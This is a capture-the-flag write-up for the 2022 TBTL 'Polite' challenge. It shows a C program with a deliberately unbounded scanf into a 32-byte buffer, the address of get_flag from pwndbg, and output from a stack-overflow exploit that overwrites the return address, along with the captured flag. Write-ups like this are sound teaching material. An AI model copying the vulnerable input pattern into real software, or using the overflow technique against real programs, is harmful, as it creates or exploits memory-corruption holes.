# 2022 TBTL - Polite

Standard pwn ctf challenge where buffer overflow overwrites the stored RIP value with a function address causing the execution to jump to the mentioned function after the current one returns.

We got the code:
```c
#include <stdio.h>

void get_flag() {
    printf("Oh no :(, my program is not secured: TBTL{REDACTED}\n");
}

int main() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    char input[32];
    printf("Please ask me for the flag: ");
    scanf("%s", input);
    printf("Not so easy!\n");
    return 0;
}
```

What we need now is the address of `get_flag` and since `scanf` is used to read the input we can easily overflow the 32-byte buffer and overwrite both RBP and RIP registers to reroute execution to `get_flag`. The address of get_flag:
```
pwndbg> info func
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401070  puts@plt
0x0000000000401080  setbuf@plt
0x0000000000401090  printf@plt
0x00000000004010a0  __isoc99_scanf@plt
0x00000000004010b0  _start
0x00000000004010e0  _dl_relocate_static_pie
0x00000000004010f0  deregister_tm_clones
0x0000000000401120  register_tm_clones
0x0000000000401160  __do_global_dtors_aux
0x0000000000401190  frame_dummy
0x0000000000401196  get_flag			; it's here
0x00000000004011ad  main
0x0000000000401220  __libc_csu_init
0x0000000000401290  __libc_csu_fini
0x0000000000401298  _fini
```

And our working exploit which enters 32 bytes of garbage, 8-byte base pointer register and RIP set to value of `0x401196`:
```
$ python3 solve_2022_tbtl_polite.py 
[+] Opening connection to 0.cloud.chals.io on port 27702: Done
[*] Switching to interactive mode
Not so easy!
Oh no :(, my program is not secured: TBTL{M457ER_of_4Dre553s}
[*] Got EOF while reading in interactive
```

Solution code is in `solve_2022_tbtl_polite.py`
